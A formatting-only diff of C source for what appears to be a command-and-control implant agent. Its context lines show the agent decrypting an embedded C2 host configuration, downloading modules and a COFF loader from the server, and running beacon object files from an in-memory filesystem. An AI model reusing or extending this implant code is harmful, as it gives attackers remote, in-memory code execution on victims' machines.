@@ -64,7 +64,7 @@ __attribute__((weak)) const size_t c2_magic_string_len = 0;
 __attribute__((weak)) const char c2_build_version[] = "N/A";
 
 /* ------------------------------------------------------------------------- */
-/* Output buffer + builtin commands                                            */
+/* Output buffer + builtin commands */
 /* ------------------------------------------------------------------------- */
 
 typedef struct {
@@ -146,7 +146,8 @@ static void mode_string(mode_t m, char out[11]) {
 
 static void fmt_date(time_t t, char *out, size_t cap) {
   struct tm tm;
-  if (localtime_r(&t, &tm) == NULL || strftime(out, cap, "%Y-%m-%d %H:%M:%S", &tm) == 0)
+  if (localtime_r(&t, &tm) == NULL ||
+      strftime(out, cap, "%Y-%m-%d %H:%M:%S", &tm) == 0)
     snprintf(out, cap, "N/A");
 }
 
@@ -192,8 +193,8 @@ static void run_ls(const c2_memfile *mem, const char *dir, obuf *out) {
   CborEncoder enc;
   cbor_encoder_init(&enc, buf, cap, 0);
   CborEncoder arr;
-  c2_status st = c2_cbor_ec(
-      cbor_encoder_create_array(&enc, &arr, CborIndefiniteLength));
+  c2_status st =
+      c2_cbor_ec(cbor_encoder_create_array(&enc, &arr, CborIndefiniteLength));
 
   if (is_mem_path(dir)) {
     size_t plen = strlen(dir);
@@ -248,7 +249,8 @@ static void run_ls(const c2_memfile *mem, const char *dir, obuf *out) {
   if (st == C2_OK)
     st = c2_cbor_ec(cbor_encoder_close_container(&enc, &arr));
   if (st == C2_OK)
-    obuf_append(out, (const char *)buf, cbor_encoder_get_buffer_size(&enc, buf));
+    obuf_append(out, (const char *)buf,
+                cbor_encoder_get_buffer_size(&enc, buf));
   else
     obuf_append(out, "ls failed\n", 10);
   free(buf);
@@ -411,8 +413,8 @@ static void run_download(c2_agent_session *s, c2_memfile *mem, const char *name,
   if (st == C2_OK) {
     char key[512];
     size_t kl = c2_memfile_key(name, strlen(name), key, sizeof(key));
-    st = kl ? c2_memfile_write(mem, c2_str_of(key, kl), buf, len)
-            : C2_ERR_NOMEM;
+    st =
+        kl ? c2_memfile_write(mem, c2_str_of(key, kl), buf, len) : C2_ERR_NOMEM;
   }
   free(buf);
   obuf_append(out, st == C2_OK ? "downloaded\n" : "download failed\n",
@@ -440,7 +442,8 @@ static const char *c2_arch_name(void) {
   return "amd64";
 }
 
-/* Ensure coffloader_linux.so is in memfs, downloading the hosted .gz if needed. */
+/* Ensure coffloader_linux.so is in memfs, downloading the hosted .gz if needed.
+ */
 static c2_status ensure_bof_loader(c2_agent_session *s, c2_memfile *mem) {
   uint8_t *probe = NULL;
   size_t probe_len = 0;
@@ -543,9 +546,10 @@ static void execute_bof(c2_agent_session *s, c2_memfile *mem,
     st = c2_bof_pack_args(tokens, tokenc, packed, packed_cap, &packed_len);
   }
   if (st == C2_OK)
-    st = c2_bof_run(loader, loader_len, bof, bof_len,
-                    (export_name != NULL && export_name[0]) ? export_name : "go",
-                    packed, packed_len, &result);
+    st =
+        c2_bof_run(loader, loader_len, bof, bof_len,
+                   (export_name != NULL && export_name[0]) ? export_name : "go",
+                   packed, packed_len, &result);
   if (st == C2_OK && result != NULL) {
     obuf_append(out, result, strlen(result));
     free(result);
@@ -563,8 +567,8 @@ static void execute_bof(c2_agent_session *s, c2_memfile *mem,
 
 /* `bof <object> [export] [args...]`: run a relocatable object already in
  * memfs. */
-static void run_bof(c2_agent_session *s, c2_memfile *mem, const c2_str_list *cmd,
-                    obuf *out) {
+static void run_bof(c2_agent_session *s, c2_memfile *mem,
+                    const c2_str_list *cmd, obuf *out) {
   char object[512];
   argn(cmd, 1, object, sizeof(object));
   if (!object[0]) {
@@ -590,9 +594,8 @@ static void run_bof(c2_agent_session *s, c2_memfile *mem, const c2_str_list *cmd
   size_t key_len = c2_memfile_key(object, strlen(object), key, sizeof(key));
   uint8_t *bof = NULL;
   size_t bof_len = 0;
-  if (key_len == 0 ||
-      c2_memfile_read_alloc(mem, c2_str_of(key, key_len), &bof, &bof_len) !=
-          C2_OK) {
+  if (key_len == 0 || c2_memfile_read_alloc(mem, c2_str_of(key, key_len), &bof,
+                                            &bof_len) != C2_OK) {
     obuf_append(out, "bof: object not found\n", 22);
     return;
   }
@@ -644,8 +647,8 @@ static void run_custom_module(c2_agent_session *s, c2_memfile *mem,
     return;
   }
   size_t gz_len = 0;
-  c2_status st =
-      c2_session_download(s, c2_str_of(file, strlen(file)), gz, gz_cap, &gz_len);
+  c2_status st = c2_session_download(s, c2_str_of(file, strlen(file)), gz,
+                                     gz_cap, &gz_len);
   if (st != C2_OK) {
     TRACE("[agent] custom_module: download %s failed: %d\n", file, st);
     obuf_append(out, "custom_module: download failed\n", 30);
@@ -797,7 +800,7 @@ static void dispatch(const c2_msgtun *m, c2_agent_session *s, c2_memfile *mem,
 }
 
 /* ------------------------------------------------------------------------- */
-/* main                                                                        */
+/* main */
 /* ------------------------------------------------------------------------- */
 
 int main(void) {
@@ -811,9 +814,9 @@ int main(void) {
   uint8_t plain[16384];
   size_t plain_len = 0;
   c2_str magic = c2_str_of((const char *)c2_magic_string, c2_magic_string_len);
-  c2_status st = c2_config_decrypt(be, magic, c2_embedded_config,
-                                   c2_embedded_config_len, plain, sizeof(plain),
-                                   &plain_len);
+  c2_status st =
+      c2_config_decrypt(be, magic, c2_embedded_config, c2_embedded_config_len,
+                        plain, sizeof(plain), &plain_len);
   if (st != C2_OK) {
     TRACE("[agent] config decrypt failed: %d\n", st);
     return 1;
@@ -834,9 +837,9 @@ int main(void) {
   }
   cfg.magic_string = magic;
   TRACE("[agent] cfg host=%.*s http_port=%.*s mode=%.*s\n",
-          (int)cfg.cc_address.len, cfg.cc_address.ptr, (int)cfg.cc_http_port.len,
-          cfg.cc_http_port.ptr, (int)cfg.c2_channel_mode.len,
-          cfg.c2_channel_mode.ptr);
+        (int)cfg.cc_address.len, cfg.cc_address.ptr, (int)cfg.cc_http_port.len,
+        cfg.cc_http_port.ptr, (int)cfg.c2_channel_mode.len,
+        cfg.c2_channel_mode.ptr);
 
   c2_transport transport = c2_transport_create(&cfg);
   c2_agent_session s;
